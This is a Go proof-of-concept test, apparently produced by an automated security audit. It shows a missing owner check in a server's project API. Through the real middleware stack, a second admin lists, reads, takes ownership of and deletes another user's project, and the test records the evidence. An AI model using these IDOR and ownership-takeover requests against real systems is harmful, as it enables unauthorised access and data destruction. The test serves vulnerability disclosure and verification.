//go:build poc

package server

// H4 PoC — Project Management No-Owner ACL
//
// Run from pkg/server:
//
//	go test -v -tags=poc -run TestH4_ProjectMgmtNoOwnerACL .
//
// The test spins up the real Fiber app (NewHandlers + registerRoutes) wired to
// an in-memory SQLite DB.  Two distinct admin users are provisioned via
// NewUserStore.  The test drives four attack primitives through the FULL
// production middleware stack (BearerAuth → RoleGuard → handler):
//
//  1. GET /api/projects         — cross-tenant enumeration (mallory sees alice's project)
//  2. GET /api/projects/:uuid   — IDOR read of another owner's project
//  3. PUT /api/projects/:uuid   — ownership-grab (mallory rewrites owner_uuid to herself)
//  4. DELETE /api/projects/:uuid — non-owner deletion of alice's project
//
// Evidence is written to archon/findings/H4-project-mgmt-no-owner-acl/evidence/.
// The last stdout line is the structured JSON verdict consumed by poc-executor.

import (
	"context"
	"database/sql"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"net/http/httptest"
	"os"
	"strings"
	"testing"
	"time"

	"github.com/gofiber/fiber/v3"
	"github.com/uptrace/bun"
	"github.com/uptrace/bun/dialect/sqlitedialect"
	"github.com/uptrace/bun/driver/sqliteshim"
	"github.com/vigolium/vigolium/pkg/database"
)

// newH4TestDB creates an in-memory SQLite database with the full schema and
// returns both the *database.DB and *database.Repository.
// Handlers check h.db != nil before any DB operation.
func newH4TestDB(t *testing.T) (*database.DB, *database.Repository) {
	t.Helper()
	sqldb, err := sql.Open(sqliteshim.ShimName, ":memory:?_journal_mode=WAL&_busy_timeout=5000")
	if err != nil {
		t.Fatalf("open sqlite: %v", err)
	}
	bunDB := bun.NewDB(sqldb, sqlitedialect.New())
	db := database.NewDBFromBun(bunDB, "sqlite")
	if err := db.CreateSchema(context.Background()); err != nil {
		t.Fatalf("create schema: %v", err)
	}
	t.Cleanup(func() { _ = db.Close() })
	return db, database.NewRepository(db)
}

func TestH4_ProjectMgmtNoOwnerACL(t *testing.T) {
	// -----------------------------------------------------------------------
	// Provision: two admin users with distinct deterministic UUIDs
	// UUID v5 is derived from email by NewUserStore — distinct emails → distinct UUIDs
	// -----------------------------------------------------------------------
	const (
		aliceToken   = "vgl_h4poc_alice_admin_secret"
		malloryToken = "vgl_h4poc_mallory_admin_secret"
	)

	users := []FileUser{
		{Name: "alice", Email: "alice@poc.local", AccessCode: aliceToken, Role: RoleAdmin},
		{Name: "mallory", Email: "mallory@poc.local", AccessCode: malloryToken, Role: RoleAdmin},
	}
	store := NewUserStore(users)

	aliceUser := store.Lookup(aliceToken)
	malloryUser := store.Lookup(malloryToken)
	if aliceUser == nil || malloryUser == nil {
		t.Fatal("user store setup error: lookup returned nil")
	}
	if aliceUser.UUID == malloryUser.UUID {
		t.Fatalf("UUID collision — alice and mallory resolved to same UUID %s", aliceUser.UUID)
	}

	fmt.Printf("[setup] alice   UUID: %s\n", aliceUser.UUID)
	fmt.Printf("[setup] mallory UUID: %s\n", malloryUser.UUID)

	// -----------------------------------------------------------------------
	// Wire the real server stack through the production code path
	// -----------------------------------------------------------------------
	db, repo := newH4TestDB(t)

	cfg := ServerConfig{
		NoAuth:    false, // auth ENABLED — proves bug exists even with auth on
		UserStore: store,
		NoAgent:   true,
		NoSwagger: true,
	}
	h := NewHandlers(nil, db, repo, nil, cfg, nil, nil, nil)
	t.Cleanup(func() { h.Close() })

	app := fiber.New()
	registerRoutes(app, h, cfg) // full production route table including BearerAuth + RoleGuard

	// -----------------------------------------------------------------------
	// Helper: send a request through the in-process Fiber app
	// -----------------------------------------------------------------------
	do := func(method, path, token, body string) (int, []byte) {
		t.Helper()
		var bodyReader io.Reader
		if body != "" {
			bodyReader = strings.NewReader(body)
		}
		req := httptest.NewRequest(method, path, bodyReader)
		if token != "" {
			req.Header.Set("Authorization", "Bearer "+token)
		}
		if body != "" {
			req.Header.Set("Content-Type", "application/json")
		}
		resp, err := app.Test(req, fiber.TestConfig{Timeout: 10 * time.Second})
		if err != nil {
			t.Fatalf("%s %s: %v", method, path, err)
		}
		defer resp.Body.Close()
		raw, _ := io.ReadAll(resp.Body)
		return resp.StatusCode, raw
	}

	jmap := func(raw []byte) map[string]any {
		var m map[string]any
		_ = json.Unmarshal(raw, &m)
		return m
	}

	// -----------------------------------------------------------------------
	// Step 1: Alice creates her project, recording herself as owner
	// -----------------------------------------------------------------------
	fmt.Println("\n[1] Alice creates her project...")
	createBody := fmt.Sprintf(
		`{"name":"alice-secret-project","description":"alice owns this","owner_uuid":%q}`,
		aliceUser.UUID,
	)
	status, raw := do("POST", "/api/projects", aliceToken, createBody)
	if status != http.StatusCreated {
		h4Fail(t, fmt.Sprintf("alice project creation returned HTTP %d; body: %s", status, raw))
	}
	aliceCreate := jmap(raw)
	aliceProjectUUID, _ := aliceCreate["uuid"].(string)
	fmt.Printf("  project UUID : %s\n", aliceProjectUUID)
	fmt.Printf("  owner_uuid   : %s\n", aliceCreate["owner_uuid"])
	if aliceProjectUUID == "" {
		h4Fail(t, "no uuid in project create response")
	}

	// -----------------------------------------------------------------------
	// Step 2: Mallory enumerates ALL projects — cross-tenant leak
	//   HandleListProjects: ownerUUID = c.Query("owner") — never enforced as caller UUID
	// -----------------------------------------------------------------------
	fmt.Println("\n[2] Mallory lists all projects (cross-tenant enumeration)...")
	status, raw = do("GET", "/api/projects", malloryToken, "")
	if status != http.StatusOK {
		h4Fail(t, fmt.Sprintf("GET /api/projects returned HTTP %d for mallory", status))
	}
	var projectList []map[string]any
	_ = json.Unmarshal(raw, &projectList)
	fmt.Printf("  projects visible to mallory: %d\n", len(projectList))

	aliceProjectVisible := false
	for _, entry := range projectList {
		p := entry
		if nested, ok := entry["project"].(map[string]any); ok {
			p = nested
		}
		if uid, _ := p["uuid"].(string); uid == aliceProjectUUID {
			aliceProjectVisible = true
		}
	}
	fmt.Printf("  alice project in mallory list: %v\n", aliceProjectVisible)

	// -----------------------------------------------------------------------
	// Step 3: Mallory reads Alice's project directly — IDOR read
	// -----------------------------------------------------------------------
	fmt.Println("\n[3] Mallory reads Alice's project (IDOR GET)...")
	status, raw = do("GET", "/api/projects/"+aliceProjectUUID, malloryToken, "")
	idorOK := status == http.StatusOK
	fmt.Printf("  IDOR GET status: %d (expected 200)\n", status)
	fmt.Printf("  body: %s\n", raw)

	// -----------------------------------------------------------------------
	// Step 4: Mallory PUTs — renames + steals ownership
	//   handlers_project.go:194-195:
	//     if req.OwnerUUID != "" { project.OwnerUUID = req.OwnerUUID }
	//   No caller identity check anywhere in HandleUpdateProject
	// -----------------------------------------------------------------------
	fmt.Println("\n[4] Mallory issues PUT /api/projects/<alice-uuid> — ownership grab...")
	takeoverBody := fmt.Sprintf(
		`{"name":"OWNED-by-mallory","owner_uuid":%q}`,
		malloryUser.UUID,
	)
	putStatus, putRaw := do("PUT", "/api/projects/"+aliceProjectUUID, malloryToken, takeoverBody)
	fmt.Printf("  PUT HTTP status : %d (expected 200)\n", putStatus)
	fmt.Printf("  PUT response    : %s\n", putRaw)

	// -----------------------------------------------------------------------
	// Step 5: Verify ownership change persisted
	// -----------------------------------------------------------------------
	fmt.Println("\n[5] Verifying ownership change (Alice GETs her project)...")
	_, afterRaw := do("GET", "/api/projects/"+aliceProjectUUID, aliceToken, "")
	afterMap := jmap(afterRaw)
	proj := afterMap
	if nested, ok := afterMap["project"].(map[string]any); ok {
		proj = nested
	}
	newName, _ := proj["name"].(string)
	newOwner, _ := proj["owner_uuid"].(string)
	fmt.Printf("  name after PUT  : %q\n", newName)
	fmt.Printf("  owner after PUT : %q\n", newOwner)
	fmt.Printf("  mallory UUID    : %q\n", malloryUser.UUID)

	ownershipStolen := putStatus == http.StatusOK &&
		newName == "OWNED-by-mallory" &&
		newOwner == malloryUser.UUID

	// -----------------------------------------------------------------------
	// Step 6: Mallory DELETEs Alice's project — no owner check
	// -----------------------------------------------------------------------
	fmt.Println("\n[6] Mallory deletes Alice's project (DELETE /api/projects/<alice-uuid>)...")
	deleteStatus, deleteRaw := do("DELETE", "/api/projects/"+aliceProjectUUID, malloryToken, "")
	fmt.Printf("  DELETE HTTP status: %d (expected 200)\n", deleteStatus)
	fmt.Printf("  DELETE body: %s\n", deleteRaw)

	// -----------------------------------------------------------------------
	// Step 7: Alice tries to GET her now-deleted project
	// -----------------------------------------------------------------------
	fmt.Println("\n[7] Alice tries to GET deleted project...")
	goneStatus, _ := do("GET", "/api/projects/"+aliceProjectUUID, aliceToken, "")
	fmt.Printf("  HTTP status: %d (expected 404)\n", goneStatus)

	projectDeleted := deleteStatus == http.StatusOK && goneStatus == http.StatusNotFound

	// -----------------------------------------------------------------------
	// Write evidence artefacts
	// -----------------------------------------------------------------------
	evidenceDir := "archon/findings/H4-project-mgmt-no-owner-acl/evidence"
	_ = os.MkdirAll(evidenceDir, 0o755)

	_ = os.WriteFile(evidenceDir+"/verdict.txt", []byte(fmt.Sprintf(
		"timestamp=%s\n"+
			"alice_project_uuid=%s\nalice_uuid=%s\nmallory_uuid=%s\n"+
			"alice_project_visible_to_mallory=%v\nidor_read_ok=%v\n"+
			"put_status=%d\nname_after_takeover=%s\nowner_after_takeover=%s\n"+
			"ownership_stolen=%v\ndelete_status=%d\ngone_status=%d\nproject_deleted=%v\n",
		time.Now().UTC().Format(time.RFC3339),
		aliceProjectUUID, aliceUser.UUID, malloryUser.UUID,
		aliceProjectVisible, idorOK,
		putStatus, newName, newOwner,
		ownershipStolen, deleteStatus, goneStatus, projectDeleted,
	)), 0o644)

	_ = os.WriteFile(evidenceDir+"/code_trace.txt", []byte(
		"handlers_project.go HandleUpdateProject lines 194-195:\n"+
			"  if req.OwnerUUID != \"\" {\n"+
			"      project.OwnerUUID = req.OwnerUUID   // no caller UUID check\n"+
			"  }\n\n"+
			"HandleDeleteProject lines 237-269:\n"+
			"  // repo.DeleteProject called — no project.OwnerUUID == getAuthUser(c).UUID guard\n\n"+
			"HandleListProjects lines 20-21:\n"+
			"  ownerUUID := c.Query(\"owner\")  // caller-supplied filter, never enforced as caller UUID\n"+
			"  projects, err := h.repo.ListProjects(c.Context(), ownerUUID)\n",
	), 0o644)

	// -----------------------------------------------------------------------
	// Structured verdict — MUST be last stdout line (consumed by poc-executor)
	// -----------------------------------------------------------------------
	fmt.Printf("\n=== Results ===\n")
	fmt.Printf("cross-tenant enumeration    : %v\n", aliceProjectVisible)
	fmt.Printf("IDOR read                   : %v\n", idorOK)
	fmt.Printf("ownership stolen            : %v\n", ownershipStolen)
	fmt.Printf("project deleted by non-owner: %v\n", projectDeleted)
	fmt.Println()

	type verdict struct {
		Status   string `json:"status"`
		Evidence string `json:"evidence"`
		Notes    string `json:"notes,omitempty"`
	}
	emit := func(v verdict) {
		b, _ := json.Marshal(v)
		fmt.Println(string(b))
	}

	switch {
	case ownershipStolen && projectDeleted:
		emit(verdict{
			Status: "confirmed",
			Evidence: fmt.Sprintf(
				"mallory (non-owner admin UUID=%s) rewrote alice project owner_uuid from %s to mallory UUID "+
					"via PUT /api/projects/%s (HandleUpdateProject:194 — no OwnerUUID==caller check); "+
					"then deleted alice's project (HandleDeleteProject:262 — no owner guard); GET returned 404 after delete",
				malloryUser.UUID, aliceUser.UUID, aliceProjectUUID,
			),
			Notes: "handlers_project.go checks only RoleGuard(admin), never project.OwnerUUID against authenticated caller UUID; both exploits confirmed through full production middleware stack (BearerAuth+RoleGuard+handler)",
		})
	case ownershipStolen:
		emit(verdict{
			Status:   "confirmed",
			Evidence: fmt.Sprintf("ownership grab confirmed: mallory rewrote alice project owner_uuid from %s to %s; delete step returned HTTP %d", aliceUser.UUID, malloryUser.UUID, deleteStatus),
		})
	case aliceProjectVisible && idorOK:
		emit(verdict{
			Status:   "confirmed",
			Evidence: "cross-tenant enumeration + IDOR read confirmed; ownership-grab inconclusive",
			Notes:    fmt.Sprintf("put_status=%d name=%q owner=%q", putStatus, newName, newOwner),
		})
	default:
		emit(verdict{
			Status:   "inconclusive",
			Evidence: "ownership change not observed in GET response after PUT",
			Notes:    fmt.Sprintf("put_status=%d name=%q owner=%q alice_visible=%v idor=%v", putStatus, newName, newOwner, aliceProjectVisible, idorOK),
		})
	}
}

// h4Fail prints a failed JSON verdict line then fails the test.
func h4Fail(t *testing.T, reason string) {
	t.Helper()
	type v struct {
		Status   string `json:"status"`
		Evidence string `json:"evidence"`
	}
	b, _ := json.Marshal(v{Status: "failed", Evidence: reason})
	fmt.Println(string(b))
	t.Fatal(reason)
}
